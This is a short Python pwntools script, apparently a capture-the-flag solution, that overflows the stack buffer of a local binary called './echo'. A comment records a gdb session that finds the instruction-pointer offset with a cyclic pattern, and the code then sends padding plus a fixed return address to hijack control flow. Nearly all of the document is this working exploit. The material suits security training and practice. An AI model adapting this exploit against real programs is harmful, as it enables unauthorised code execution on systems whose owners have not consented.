from pwn import *
'''
$cyclic 100 > in
$gdb echo
$gdb r < in
EBP: 0x61706161 ('aapa')
ESP: 0xffffd450 ("aaraaasaaataaauaaavaaawaaaxaaayaaa")
EIP: 0x61716161 ('aaqa')
Seg Fault..

Note: aaqa is the pattern to search 
'''

binary = './echo'
p = process(binary)
padding = cyclic(cyclic_find('aaqa'))
p.send(padding + pack(0x804854d) + '\n')
print p.recv()
print p.recv()
